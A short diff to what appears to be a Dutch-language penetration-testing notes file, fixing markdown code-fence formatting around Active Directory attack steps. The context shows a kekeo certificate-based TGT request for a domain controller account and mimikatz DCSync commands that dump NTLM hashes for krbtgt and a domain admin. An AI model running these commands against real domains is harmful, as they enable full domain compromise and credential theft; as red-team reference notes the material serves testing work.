@@ -98,8 +98,8 @@ b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<
 
 5. Start mimikatz (gentlwiki) om een dcsync uit te voeren en de NTLM hash van iedere gewenste user te dumpen:
 1. lsadump::dcsync /domain:<domain> /user:krbtgt
-2. lsadump::dcsync /domain:<domain> /user:dcadmin```
- <br/>
+2. lsadump::dcsync /domain:<domain> /user:dcadmin
+```
   
  # Physical attacks
   
